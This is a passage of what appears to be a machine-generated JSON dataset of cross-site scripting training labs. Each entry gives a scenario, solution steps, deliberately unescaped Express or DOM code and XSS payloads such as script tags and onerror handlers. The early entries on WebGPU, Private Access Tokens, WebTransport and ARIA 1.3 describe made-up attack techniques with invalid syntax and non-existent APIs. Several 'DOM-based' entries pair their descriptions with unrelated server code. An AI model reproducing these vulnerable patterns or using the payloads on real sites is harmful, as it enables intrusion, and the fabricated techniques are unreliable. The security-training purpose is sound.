    "srcCode": "navigator.serial.requestPort().then(port => {\n  document.getElementById('device').innerText = \n    port.getInfo().productName; // Vulnerable CSS unescape\n});"
  },
  {
    "Lab scenario": "SVG Filter Primitive XSS in Data Visualization Dashboard",
    "Lab Description": "Analytics platform implements SVG filters with unsafe foreignObject processing. The application uses <feImage> with data: URLs without MIME validation. To solve: Achieve XSS through filter chain injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft SVG filter: <feImage xlink:href='data:text/html,<script>alert(1)</script>'/>",
      "Bypass CSP using filter composition",
      "Chain with <animate> timing attacks",
      "Automate with D3.js visualization toolkit",
      "Verify through dashboard PDF export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<filter id='x'><feImage result='xss' href='data:text/html,<script>alert(1)</script>'/></filter>",
      "<feFuncR type='table' tableValues='</text><script>alert(1)</script>'/>"
    ],
    "srcCode": "const svg = `<svg>${userInput}</svg>`;\ndocument.body.insertAdjacentHTML('beforeend', svg); // Vulnerable"
  },
  {
    "Lab scenario": "WebGPU Storage Texture XSS in 3D Medical Imaging",
    "Lab Description": "Radiology viewer uses storage textures for volume rendering with unsafe buffer mapping to DOM. The application writes scan metadata into textures via compute shaders without validation. To solve: Inject HTML through crafted texture data writes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze texture bind groups via WebGPU Inspector",
      "Craft payload: [[group(1), binding(0)]] var<storage> x: array<u32> = [0x3C736372...];",
      "Bypass texture format validation using rgba8unorm",
      "Chain with timestamp queries for synchronization",
      "Verify through DICOM viewer overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "device.createTexture({ format: 'rgba8unorm', usage: GPUTextureUsage.STORAGE }).createView()",
      "[[stage(compute)]] fn main() { textureStore(xTexture, vec2<i32>(), vec4<f32>(0.0)); }"
    ],
    "srcCode": "const texture = device.createTexture({ /* User-controlled */ });\ndocument.getElementById('scan-data').innerHTML = \n  new TextDecoder().decode(texture.read()); // Vulnerable"
  },
  {
    "Lab scenario": "Private Access Token Bypass in Paywall System",
    "Lab Description": "News paywall implements PATs with unsafe token reflection in <meta> tags. The application leaks token details via innerHTML for debugging. To solve: Forge PATs containing XSS payloads through Chrome's Trust Token API.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept PAT issuance via DevTools Protocol",
      "Craft payload: document.requestTrustToken({type: 'token-commitment', data: '<script>'})",
      "Bypass issuer validation using DNS CNAME cloaking",
      "Automate with Puppeteer trustToken API",
      "Verify through paywall debug mode"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<meta name='trust-token' content='<script>alert(1)</script>'>",
      "fetch('https://issuer', { trustToken: { type: 'send-redemption-record' } })"
    ],
    "srcCode": "app.get('/token', (req, res) => {\n  res.send(`<meta name='pat' content='${req.query.token}'>`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "CSS Nesting Injection in Design System Theme Editor",
    "Lab Description": "UI theme builder processes nested CSS rules with vulnerable postcss-preset-env configuration. The application uses insertRule() with raw user input. To solve: Break style context through deeply nested @media queries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify nesting depth limit via trial/error",
      "Craft payload: @media (width: </style><script>alert(1)</script>) { & { color: red } }",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with :has() selector polyfill",
      "Verify through theme preview iframe"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@layer x { @media \\3C script\\3E { & { content: \"alert(1)\" } }",
      ":is(&, </style><svg/onload=alert(1)>) { color: red }"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(userInput); // Vulnerable\ndocument.adoptedStyleSheets = [sheet];"
  },
  {
    "Lab scenario": "WebTransport Datagram XSS in Autonomous Vehicle Control",
    "Lab Description": "Self-driving car interface uses unidirectional WebTransport datagrams for sensor updates. The application renders LIDAR data via innerHTML without validation. To solve: Inject payloads through malformed QUIC datagram buffers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebTransport session using Wireshark QUIC dissector",
      "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
      "Bypass MTU limits using DATAGRAM frame fragmentation",
      "Automate with webtransport-go client",
      "Verify through 3D point cloud visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "quic.SendDatagram([]byte{'<','s','c','r','i','p','t','>'})",
      "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "const decoder = new TextDecoder();\ntransport.datagrams.readable.getReader().read().then(({value}) => {\n  document.body.innerHTML += decoder.decode(value); // Vulnerable\n});"
  },
  {
    "Lab scenario": "ARIA 1.3 Role Bypass in Accessibility Dashboard",
    "Lab Description": "WCAG compliance tool implements ARIA 1.3 roles with dangerous role=generic parsing. The application uses setAttribute('role') with user input. To solve: Achieve XSS through role=alertdialog and aria-errormessage chaining.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ARIA 1.3 role support via a11y tree",
      "Craft payload: <div role='generic' aria-errormessage='</div><script>alert(1)</script>'>",
      "Bypass sanitizer using ARIA relationship attributes",
      "Chain with aria-live assertive mode",
      "Verify through axe-core audits"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<div role='math' aria-describedat='x'><template id='x' shadowroot=open><script>alert(1)</script>",
      "<span role='none' aria-details='</span><svg/onload=alert(1)>'></span>"
    ],
    "srcCode": "function setRole(userRole) {\n  element.setAttribute('role', userRole); // Vulnerable\n}"
  },
  {
    "Lab scenario": "Stored XSS in internal bug tracking system notes",
    "Lab Description": "A bug tracking system allows developers to add notes to bug reports. These notes are rendered in the admin panel without proper sanitization, leading to stored XSS. To solve: Inject a script payload in a bug note.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a bug report with a note: <script>alert('BugXSS')</script>",
      "Check admin panel to confirm execution.",
      "Test encoded variations.",
      "Validate across different roles.",
      "Confirm persistence after reload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  res.send(`<div>${note}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('BugXSS')</script>",
      "<img src=x onerror=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in product filtering system",
    "Lab Description": "An e-commerce site reflects user-selected filters into the product list page without sanitization. To solve: Inject an XSS payload into the filter parameters.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a filter value with <script>alert('Filter')</script>.",
      "Observe execution on the product list page.",
      "Test encoding bypasses.",
      "Validate across different filter parameters.",
      "Confirm payload persistence."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-filter', (req, res) => {\n  const filter = req.body.filter;\n  res.send(`<h2>Filtered by: ${filter}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Filter')</script>",
      "<svg/onload=alert('FilterXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS via localStorage user theme",
    "Lab Description": "The application loads user-preferred themes from localStorage and inserts them into the DOM without sanitization. To solve: Inject a payload into the theme field.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set localStorage.theme = '<img src=x onerror=alert(\"Theme\")>'",
      "Reload the app.",
      "Observe execution of the payload.",
      "Try different injection formats.",
      "Bypass possible CSP restrictions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/load-theme', (req, res) => {\n  const theme = req.body.theme;\n  res.send(`<div id='theme'>${theme}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Theme')>",
      "<svg onload=alert('ThemeXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online recipe sharing site ingredients",
    "Lab Description": "A recipe sharing platform allows users to submit ingredients. The application renders them directly without escaping. To solve: Inject a script into the ingredients list.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add an ingredient: <script>alert('Recipe')</script>",
      "Submit the recipe.",
      "Observe execution on view page.",
      "Experiment with different HTML elements.",
      "Confirm persistence across users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ingredient', (req, res) => {\n  const ingredient = req.body.ingredient;\n  res.send(`<ul><li>${ingredient}</li></ul>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Recipe')</script>",
      "<img src=x onerror=alert('Ingredient')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter subscription confirmation",
    "Lab Description": "When users subscribe to the newsletter, their email is reflected back in the confirmation message without sanitization. To solve: Inject an XSS payload via the email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit email: <script>alert('Newsletter')</script>.",
      "Observe reflected payload execution.",
      "Test encoded variants.",
      "Validate across different form submissions.",
      "Check server-side response for reflection."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h1>Subscribed: ${email}</h1>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Newsletter')</script>",
      "<img src=x onerror=alert('SubXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in course discussion forum",
    "Lab Description": "Students post questions in the course forum. Posts are rendered without sanitization. To solve: Inject a persistent XSS payload into a forum post.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a forum post with <script>alert('Forum')</script>.",
      "Save and view the post.",
      "Observe script execution.",
      "Try payloads inside attributes.",
      "Validate across multiple sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-question', (req, res) => {\n  const question = req.body.question;\n  res.send(`<div>${question}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Forum')</script>",
      "<svg/onload=alert('ForumXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in online documentation viewer",
    "Lab Description": "The documentation viewer loads section content based on a URL hash and renders it using innerHTML. There's no sanitization. To solve: Inject a malicious fragment.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set location.hash = '#<img src=x onerror=alert(\"Docs\")>'",
      "Reload the page.",
      "Observe execution in documentation viewer.",
      "Experiment with SVG and other vectors.",
      "Confirm on mobile and desktop browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/load-doc', (req, res) => {\n  const doc = req.body.doc;\n  res.send(`<div id='doc'>${doc}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Docs')>",
      "<svg onload=alert('DocXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in movie review search field",
    "Lab Description": "A movie review site reflects the search query without escaping. To solve: Inject a payload into the search input.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter <script>alert('Movie')</script> into the search box.",
      "Submit and observe execution.",
      "Use URL encoding tricks.",
      "Try nesting inside attributes.",
      "Validate payload across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-movie', (req, res) => {\n  const search = req.body.search;\n  res.send(`<h2>Searching for: ${search}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Movie')</script>",
      "<img src=x onerror=alert('ReviewXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online book store reviews",
    "Lab Description": "Users can submit reviews for books. Reviews are rendered without sanitization. To solve: Submit a review containing an XSS payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a review: <script>alert('Book')</script>.",
      "Check review section for execution.",
      "Try iframe and svg payloads.",
      "Confirm across user accounts.",
      "Observe execution after logout/login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<div>${review}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Book')</script>",
      "<svg/onload=alert('ReviewXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS via welcome message field",
    "Lab Description": "The welcome message for logged-in users is dynamically injected into the DOM using innerHTML without escaping. To solve: Inject an XSS payload via user name.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register with name: <img src=x onerror=alert('Welcome')>.",
      "Login and observe execution.",
      "Test attribute and SVG payloads.",
      "Confirm execution on mobile browsers.",
      "Chain multiple payloads if possible."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Welcome, ${name}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Welcome')>",
      "<svg/onload=alert('WelcomeXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event announcement system",
    "Lab Description": "An event management platform allows organizers to create announcements. Announcements are rendered without sanitization. To solve: Inject a persistent XSS payload in the announcement text.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an announcement with <script>alert('Event')</script>.",
      "Reload the announcement page.",
      "Observe script execution.",
      "Test using image-based payloads.",
      "Confirm execution for other users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-announcement', (req, res) => {\n  const announcement = req.body.announcement;\n  res.send(`<div>${announcement}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Event')</script>",
      "<img src=x onerror=alert('AnnounceXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in flight booking search form",
    "Lab Description": "A flight booking system reflects search parameters back into the results page without escaping. To solve: Inject a script payload in the city field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit departure city: <script>alert('Flight')</script>.",
      "Observe execution in the results page.",
      "Try encoded versions to evade filters.",
      "Check both GET and POST methods.",
      "Validate with different user agents."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-flight', (req, res) => {\n  const city = req.body.city;\n  res.send(`<h2>Flights from: ${city}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Flight')</script>",
      "<svg/onload=alert('FlightXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS via browser localStorage theme selection",
    "Lab Description": "The application saves user theme preferences in localStorage and applies them directly to the page without sanitization. To solve: Inject a payload via localStorage manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set localStorage.theme = '<img src=x onerror=alert(\"Theme\")>'",
      "Reload the page and trigger execution.",
      "Try iframe and svg payloads.",
      "Validate with different browsers.",
      "Monitor CSP violations if any."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/load-theme', (req, res) => {\n  const theme = req.body.theme;\n  res.send(`<div id='theme'>${theme}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Theme')>",
      "<svg onload=alert('ThemeXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online job portal application letter",
    "Lab Description": "Candidates can submit a cover letter when applying for jobs. Letters are displayed to employers without sanitization. To solve: Inject a stored XSS payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit cover letter: <script>alert('JobApp')</script>.",
      "Employer views the application.",
      "Observe script execution.",
      "Test with different HTML tags.",
      "Validate persistence across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const letter = req.body.letter;\n  res.send(`<div>${letter}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('JobApp')</script>",
      "<img src=x onerror=alert('ApplicationXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in forgot password page",
    "Lab Description": "The password reset page reflects email addresses without encoding. To solve: Inject a script payload in the email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit: <script>alert('Reset')</script> as email.",
      "Observe execution in confirmation page.",
      "Use URL encoding to evade filters.",
      "Try payloads in different parameters.",
      "Confirm across various browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h1>Password reset link sent to ${email}</h1>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Reset')</script>",
      "<svg/onload=alert('ResetXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in library management system book reviews",
    "Lab Description": "Students submit book reviews. Reviews are rendered without escaping. To solve: Inject an XSS payload in the review form.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit: <script>alert('Library')</script> as review.",
      "Observe execution in book page.",
      "Experiment with various payload types.",
      "Confirm persistence after logout/login.",
      "Try attribute-based injections."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<p>${review}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Library')</script>",
      "<img src=x onerror=alert('LibraryXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in hotel booking form",
    "Lab Description": "The booking form reflects user data after submission without escaping. To solve: Inject an XSS payload via guest name.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter guest name: <script>alert('Hotel')</script>.",
      "Submit and observe reflected execution.",
      "Use encoding tricks to evade filters.",
      "Confirm execution on booking confirmation page.",
      "Test different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-hotel', (req, res) => {\n  const guest = req.body.guest;\n  res.send(`<h1>Booking for: ${guest}</h1>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Hotel')</script>",
      "<img src=x onerror=alert('HotelXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in social media post editor",
    "Lab Description": "User-generated posts are saved in localStorage and dynamically injected into the feed using innerHTML without escaping. To solve: Inject a script via a post.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set localStorage.post = '<svg onload=alert(\"Feed\")>'",
      "Reload feed page.",
      "Observe payload execution.",
      "Try iframe and img based XSS.",
      "Check if payload persists across reloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-post', (req, res) => {\n  const post = req.body.post;\n  res.send(`<div>${post}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<svg onload=alert('Feed')>",
      "<img src=x onerror=alert('FeedXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online medical appointment booking notes",
    "Lab Description": "Patients can leave notes for doctors while booking appointments. Notes are rendered without escaping, enabling XSS. To solve: Inject a malicious script.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit note: <script>alert('Appointment')</script>.",
      "Check notes rendering for execution.",
      "Validate across different doctor profiles.",
      "Test filter bypass techniques.",
      "Check persistence across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-appointment', (req, res) => {\n  const note = req.body.note;\n  res.send(`<p>${note}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Appointment')</script>",
      "<svg/onload=alert('AppointmentXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in feedback form of shopping website",
    "Lab Description": "The feedback page reflects comments without sanitization. To solve: Inject XSS payload via feedback field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback: <script>alert('Feedback')</script>.",
      "Observe execution on confirmation page.",
      "Use encoding tricks.",
      "Confirm execution across browsers.",
      "Check reflection in other fields."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<p>Your feedback: ${feedback}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Feedback')</script>",
      "<img src=x onerror=alert('FeedbackXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in conference attendee bio",
    "Lab Description": "The conference system allows users to submit a bio displayed publicly without sanitization. To solve: Inject a persistent XSS payload into the bio field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register as an attendee and fill bio with <script>alert('Conference')</script>.",
      "Save and view your public profile.",
      "Observe script execution.",
      "Check persistence after logout.",
      "Test additional payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bio', (req, res) => {\n  const bio = req.body.bio;\n  res.send(`<div>${bio}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Conference')</script>",
      "<img src=x onerror=alert('ConferenceXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset confirmation",
    "Lab Description": "The password reset confirmation page reflects user input without escaping. To solve: Inject an XSS payload through the email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit email: <script>alert('Reset')</script>.",
      "Observe reflected payload execution.",
      "Check HTML source for vulnerable reflection.",
      "Try encoded payloads.",
      "Test across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-reset', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h3>Reset link sent to: ${email}</h3>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Reset')</script>",
      "<svg/onload=alert('ResetXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online event RSVP comments",
    "Lab Description": "RSVP forms allow users to leave comments, which are rendered unsanitized. To solve: Inject a persistent XSS payload via the comment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit comment: <script>alert('RSVP')</script>.",
      "View event RSVP list.",
      "Observe script execution.",
      "Test with multiple HTML injection vectors.",
      "Confirm persistence after reloading."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-rsvp', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>${comment}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('RSVP')</script>",
      "<img src=x onerror=alert('RSVPXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in flight ticket booking error page",
    "Lab Description": "Flight booking system reflects invalid parameters in error pages without escaping. To solve: Inject a script via a broken booking attempt.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Trigger booking error with: <script>alert('Flight')</script> in passenger name.",
      "Observe reflected payload execution.",
      "Experiment with different input fields.",
      "Use encoding to bypass basic filters.",
      "Confirm across different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-flight', (req, res) => {\n  const passenger = req.body.passenger;\n  res.send(`<h1>Error booking for: ${passenger}</h1>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Flight')</script>",
      "<img src=x onerror=alert('FlightError')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in project task dashboard widget",
    "Lab Description": "Task details are read from localStorage and inserted with innerHTML without sanitization. To solve: Inject a payload into localStorage data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set localStorage.task = '<img src=x onerror=alert(\"Task\")>'",
      "Reload the dashboard.",
      "Observe execution inside task widget.",
      "Test nested tags and alternative vectors.",
      "Confirm no CSP blocks."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-task', (req, res) => {\n  const task = req.body.task;\n  res.send(`<div>${task}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Task')>",
      "<svg/onload=alert('TaskWidget')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in fitness app progress notes",
    "Lab Description": "Users log their fitness progress, which is displayed without sanitization. To solve: Inject a script into the progress notes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit progress note: <script>alert('Fitness')</script>.",
      "Reload profile dashboard.",
      "Observe execution of injected code.",
      "Check persistence post-logout.",
      "Attempt using iframe payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/log-progress', (req, res) => {\n  const note = req.body.note;\n  res.send(`<p>${note}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Fitness')</script>",
      "<img src=x onerror=alert('ProgressXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in vehicle service appointment booking",
    "Lab Description": "Vehicle service booking form reflects user name unsanitized. To solve: Inject an XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit owner name: <script>alert('Service')</script>.",
      "Confirm script execution in confirmation page.",
      "Use Burp Suite to fuzz other fields.",
      "Test event-based payloads.",
      "Confirm cross-browser behavior."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-service', (req, res) => {\n  const owner = req.body.owner;\n  res.send(`<h2>Service booking for ${owner}</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Service')</script>",
      "<svg/onload=alert('VehicleXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online school class comments",
    "Lab Description": "Students leave class feedback, which is rendered without escaping. To solve: Inject a persistent XSS payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback: <script>alert('Class')</script>.",
      "View feedback list as another user.",
      "Observe execution.",
      "Test payload obfuscation techniques.",
      "Confirm persistence across users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<div>${feedback}</div>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Class')</script>",
      "<img src=x onerror=alert('ClassFeedback')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online portfolio contact form",
    "Lab Description": "The contact form reflects submitted data back without encoding. To solve: Inject a script payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name field with <script>alert('Portfolio')</script>.",
      "Check confirmation page for execution.",
      "Use DevTools to analyze DOM structure.",
      "Try encoded versions for bypass.",
      "Validate across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact-submit', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Thanks ${name}, we will contact you soon.</h2>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('Portfolio')</script>",
      "<svg/onload=alert('ContactXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in dynamic leaderboard update",
